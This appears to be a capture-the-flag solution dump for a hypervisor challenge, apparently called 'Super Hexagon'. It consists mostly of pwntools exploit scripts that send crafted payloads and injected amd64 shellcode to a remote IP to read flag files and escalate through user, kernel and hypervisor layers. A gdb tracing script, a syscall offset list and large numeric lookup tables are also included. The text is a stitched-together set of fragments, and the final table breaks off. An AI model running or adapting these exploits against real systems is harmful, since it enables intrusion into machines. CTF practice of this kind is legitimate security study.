payload += '%%%%1;'
payload += str(0x2030A4 + 0x100 - 0x7b6) + '+'
# payload += str(0x7BEC0 - 0x4f322) + '\x011'
# payload += ';-'
# payload += '0;'
# payload += '.'
payload += '0;'
payload += ','
payload = payload.ljust(0x100, '\x01')
payload += asm(shellcraft.amd64.linux.open('flag', 0, 0))
payload += asm(shellcraft.amd64.linux.read(3, 'rsp', 0x100))
payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 0x100))
p.sendline(payload)
p.interactive()
(0, '0x239L') read
(1, '0xa9aL') write
(2, '0x972L') open
(3, '0xf4bL') 
(5, '0x1caL')
(9, '0xc47L')
(10, '0x17b2L')
(11, '0xd54L')
(12, '0xbc6L')
(20, '0xb0dL')
(21, '0xa4cL')
(60, '0x966L')
(158, '0xb87L')
(221, '0x195L')
(231, '0x966L')
(257, '0xa39L')
from pwn import *
import time
context(arch = 'amd64', os = 'linux')
context.aslr = False
def runshellcode(p, s):
    payload = '4294967295\\'
    payload += '%' * ((0x2020a0 - 0x202030) / 4 - 2)
    payload += '0:'
    payload += '1:'
    payload += '%%%%1;'
    payload += str(0x2030A4 + 0x100 - 0x7b6) + '+'
    payload += '0;'
    payload += ','
    payload = payload.ljust(0x100, '\x01')
    payload += asm('push 0x61616161')
    payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 0x4))
    payload += asm(shellcraft.amd64.linux.read(0, 'rsp', 0x1000))
    payload += asm('jmp rsp')
    p.sendline(payload)
    p.recvuntil('aaaa')
    p.send(s)
    context.log_level = 'debug'
def main():
    p = remote('35.200.23.198', 31733)
    #p = process('./user.elf')
    #p = process('./hypervisor.elf kernel.bin ld.so.2 ./user.elf'.split(' '))
    payload = ''
    mmap_addr = 0x500000
    payload += asm(shellcraft.amd64.linux.mmap(mmap_addr, 0x10000, 7, 16, -1, 
0))
    payload += asm('push rax')
    payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 8))
    payload += asm(shellcraft.amd64.linux.read(0, mmap_addr, 0x10000))
    payload += asm(shellcraft.amd64.linux.write(1, mmap_addr, 
0x10000000000000000 - mmap_addr + 0x300000))
    payload += asm('push rax')
    payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 8))
    runshellcode(p, payload)
    time.sleep(10)
    payload = 'flag2'.ljust(8, '\x00')
    payload += p64(3) + p64(0x100) + p64(0x100)
    payload += p64(1) + p64(0x100) + p64(0x100)
    payload = payload.ljust(0xa5d, '\x90') + '\x90'*36
Super Hexagon | solved 1, stuck 2 | pzhxbz
scanf
Reverse
EOP
c++
gdb script
    payload += asm('''
    mov dx, 0x8000
    mov eax, 0x0
    ''')
    payload += '\xef\xed'
    payload += asm('''
    mov dx, 0x8001
    mov eax, 0x8
    ''')
    payload += '\xef\xed'
    payload += asm('''
    mov dx, 0x8002
    mov eax, 0x20
    ''')
    payload += '\xef\xed'
    payload += '\xeb\xfe'
    payload = payload.ljust(0xadb, '\x90')
    payload += '\xeb\x80'
    p.send(payload)
    p.interactive()    
if __name__ == '__main__':
    main()
3
 orz
b *(0x8000000+0x5620)
python f = open('log','w')
run < test_input
set $ipx=1
while ($ipx)
  python a = hex(gdb.parse_and_eval("$rax"))
  python f.write(a+'\n')
  continue
end
from pwn import *
index_table1 = 
[1448535819,1128528919,3149608817L,134807173,3570665939L,3806473211L,272857014
2L,1936927410,3014904308L,757936956,2358043856L,3082270210L,2374833497L,101119
117,2324303965L,3166450293L,3334870987L,3486456007L,2593817918L,2863289243L,12
96954911,3941258622L,1212708960,3772817536L,774785486,1061104932,3284375988L,3
36915093,4227576212L,1970658879,4210704413L,3907542533L,3469666638L,791656519,
555856463,1600120839,1953771446,3318050105L,3739122733L,1246425883,3924406156L
,3048553849L,2004309316,2981184143L,117900548,2913818271L,1347425158,116215209
0,4075994776L,3452801980L,1802191188,3368558019L,2526413901L,1717973422,309908
6211L,320073617,3267520573L,2459073467L,690572490,2947538404L,3200170254L,9600
92585,993743570,623234489,4042274275L,1330609508,707409464,4261233945L,2644344
890L,3520169900L,3553823959L,2341200340L,3065399179L,33721211,1145370899,26780
00449L,3789639945L,1094809452,1819034704,825304876,505323371,454758676,2560101
957L,1549570805,589510964,3991785594L,370565614,4244419728L,2240146396L,397489
8163L,2391699371L,724289457,1313770733,185304183,2543318468L,1482222851,842161
630,1195869153,16904585,2930650221L,3840204662L,2122209864,2442199369L,4160172
263L,2021174981,2577006540L,1835906521,2779097114L,2223250005L,3604382376L,414
3366510L,1633760426,202146163,2071712823,875866451,1532729329,1280051094,37222
49951L,0,421108335,2088554803,2475919922L,2896996118L,252705665,4126522268L,21
39073473,1027450463,404253670,606354480,3132802808L,1229556201,2509602495L,165
0609752,572704957,976921435,3031747824L,3537042782L,4025441025L,2408554018L,37
55969956L,2745392279L,2273796263L,488498585,2610656439L,2307484335L,1515873912
,3654908201L,2711738348L,286352618,522153698,4294954594L,2661219016L,107797066
1,3705468758L,640071499,1431674361,1397975412,353704732,2812748641L,1566401404
,3250655951L,2425417920L,3385453642L,1381144829,2694850149L,3435946549L,741130
933,2172752938L,4278075371L,673758531,943204384,387420263,1499012234,67403766,
3351766594L,3873854477L,269522275,3823360626L,1987486925,1010587606,3115957258
L,1886408768,3671720923L,2155898275L,168457726,1044307117,2627498419L,39580561
83L,3638069408L,909517352,84250239,1785376989,1179021928,808507045,1263207058,
1667481553,3688624722L,2256965934L,859024471,437969053,3233866566L,1903272393,
1414818928,1852755755,4177054566L,656885442,2290653990L,2189618904L,2492763958
L,1616954659,3587569754L,3503322661L,1465325186,538985414,3890718084L,29643701
82L,1111625118,2037997388,2105352378,2829637856L,3301219504L,2762234259L,17348
52647,235801096,2880152082L,1920129851,3183330300L,3402274488L,218984698,41938
60335L,1364320783,4059153514L,1768540719,4109650453L,892688602,471602192,40086
18632L,926405537,2054825406,50559730,3621221153L,1701137244,151588620,38570022
39L,3419105073L,1751661478,1684323029,2998024317L,4092808977L,3216984199L,2206
408529L,303177240,2795950824L,1583225230,2846435689L,1869561506]
index_table2 = 
[67438343,1346661484,3474112961L,1136470056,1858205430,1427801220,1604730173,4
240686525L,3371867806L,1618495560,1593692882,628543696,132669279,2381579782L,8
95667404,561240023,3190127226L,4173773498L,2808121223L,3460902446L,3932426513L
,1548445029,714375553,4106859443L,247054014,2317113689L,1819754817,943073834,3
236991120L,4213957346L,3865778200L,2472125604L,1764338089,2648709658L,84794254
7,269753372,1413573483,1937837068,2714974007L,3985395278L,2005142283,214001382
9,2180714255L,2086886749,3607942099L,3730649650L,1292146326,357233908,18055900
46,2673257901L,3273509064L,2629563893L,2269691839L,1537423930,1158584472,10099
86861,2202908856L,1030275778,2539430819L,2788911208L,3407333062L,2292903662L,3
906119334L,156361185,3772295336L,2693322968L,2894582225L,4135519236L,428126358
9L,1791291889,1966259388,424017405,3259377447L,3596041276L,2249412688L,3571551
115L,1281325433,2494692347L,3450107510L,1337073953,3663213877L,1872369945,2100
867762,606945087,2581929245L,3439303065L,2651669058L,134876686,2182502231L,244
8364307L,2427780348L,1685933903,3973554593L,180140473,0,828885963,3518980963L,
471536917,335103044,3096890058L,3316545656L,2722000751L,1926947811,1886147668,
580816783,1091280799,3528604475L,536235341,1470903091,3674462938L,1403597876,2
336732854L,1657733119,112439472,468929098,2517060684L,4201647373L,447260069,16
29726631,1831644846,1203253039,3145437842L,2989126515L,2963064004L,1048943258,
1361019779,3850780736L,4039947444L,2515145748L,3719326314L,1994384612,29429948
25L,2922473062L,4269083146L,1189331136,3504639116L,1481532002,600137824,915379
348,1724643576,673330742,1004237426,3918088521L,1494584717,3249241983L,2034087
349,1737496343,2827146966L,981507485,4254618194L,4120009820L,3304429463L,28762
14926L,2060512749,3382800753L,2449623883L,2605951658L,2360338921L,2127948522,1
99710294,2849585465L,3741769181L,1670713360,3029976003L,1071543669,4013619705L
,1561365130,647727240,3878746103L,2855559521L,735014510,1146451831,1270294054,
2072707586,45529015,1213890174,809247780,336665371,2760761311L,2741338240L,383
9733679L,514695842,781289094,402408259,1224839569,3163803085L,1899477947,17523
19558,2982619947L,2158026976L,202311945,380087468,2314273025L,1697030304,37064
22661L,2916892222L,65886296,3117229349L,2562650866L,2403512753L,312650667,1391
647707,3077872539L,876159779,4053228379L,3049401388L,1323945678,1526257109,539
506744,801794409,2782277680L,1122420679,740766001,666920807,22802415,90106088,
869366908,3326287904L,3393988905L,1079013488,290452467,3946839806L,4187837781L
,2225465319L,3999340054L,1459084508,3783477063L,3212744085L,2248017928L,334029
2047L,4068082435L,3585762404L,3811963120L,763158238,404623890,1953059667,12570
32137,3639509634L,2384027230L,3122691453L,695851481,2584233285L,963495365,3652
545901L,490797818,3056563316L,936672123,2019973722,3798867743L,4079086828L,414
6392043L,3184009762L,3010567324L,3540636884L,266490193,223667942]
index_table3 = 
[3188637369L,582820552,701114700,4220844977L,1243302643,2083749073,4237360308L
,274927765,1468159766,1029651878,1293897206,3161832498L,1722705457,1730635712,
1125598204,1117667853,3815957466L,1443583719,2167046548L,3554136844L,354161947
,1167738120,92210574,1059340077,2663948026L,4009881435L,446503648,2026207406,1
941074730,3213344584L,3251618066L,1097613687,1586388505,607134780,3104487868L,
3832997087L,83231871,2953228467L,1872916286,1612931269,1331974013,3884246949L,
2345962465L,2469565322L,675489981,3492139126L,3095640141L,1442403741,306260947
9L,3368273949L,3570652169L,733031367,192351108,1568431459,3377121772L,15425442
79,510336671,2284226715L,3892701278L,3426077794L,1883271248,3517763975L,255469
7742L,3136862918L,2546243573L,1649959502,1909027233,66192250,1674666943,424633
8885L,2109373728,2309982570L,4159174448L,3044652349L,2275903328L,2671877899L,1
003633490,1088766086,933312467,3918326191L,3308897645L,384702049,3601389186L,2
716639703L,750070978,4120704443L,1792895664,1800694593,2195227374L,3070408630L
,2719916717L,3461271273L,234491248,3775521105L,2926423596L,3696680183L,3984256
464L,1240025481,1181238898,2833295576L,2691014694L,1205946243,142936318,642459
319,1594318824,785264201,3579500024L,151783695,3934186197L,117704453,260116475
,496573925,941635624,3858752814L,1051541212,1817209924,2994582072L,2393607791L
,109905652,3859670612L,2118680154,2887167143L,1638555956,3643398521L,191649865
1,2428539120L,3451702675L,3019158473L,1848340175,1416647788,2143387563,2587794
053L,3679640562L,2978984258L,4001951402L,1400132457,558834098,3409038183L,2612
501364L,667035462,853422685,2067233748,2629016689L,2761139289L,3529429757L,428
4678094L,632890829,1842965941,4095079498L,816132310,3722435846L,1700554059,121
4269560,2000975701,824979751,1359958498,3808158251L,2158198885L,2769986984L,12
67878658,454302481,3299919004L,1958114351,4070109886L,328274927,4193253690L,96
7391705,1020673111,345314538,3958893348L,2870127522L,235408906,2035054943,2580
322815L,2437517569L,3225862371L,2059303461,3283403673L,184420981,1324174988,15
17836902,3727548028L,3187457475L,2203157279L,1392333464,758918451,41616011,908
604962,25756145,4167497931L,0,3144792887L,2461766267L,1967093214,1755736123,26
37864320L,3035673804L,4078039887L,3258827368L,470817812,208866433,793194424,28
08194851L,3401108118L,2251196049L,4276878911L,2486604943L,534912878,1559583890
,1502239004,426711450,1476614381,4196268608L,1284918279,3634419848L,3485978392
L,3752124301L,2842274089L,3671841283L,708323894,1142113529,3335243287L,1993176
740,903492952,4050317764L,2321386000L,2521667076L,1350979603,1764714954,877868
201,2220196890L,303567390,2371456277L,2245821931L,392632208,3975408673L,236247
7796L,2744623964L,979057315,4041470005L,3343042534L,4134467265L,417732715,3005
52548,590619449,3766542496L,2512360830L,2401406878L,1691706554,2862328403L,280
0264914L,2912922966L,2951000029L,861352876,3609319283L,549855299]
index_table4 = 
[3254152897L,164942601,2959793584L,416270104,3784037601L,3834433764L,175756016
8,4258422525L,2986054833L,2131031679,4036018416L,3644434905L,1563614813,736295
723,398904087,1403689811,528699679,0,3384014025L,2215344004L,759112749,1277807
180,3357720008L,1943478643,2539385239L,2491493012L,3634946264L,1303937869,3153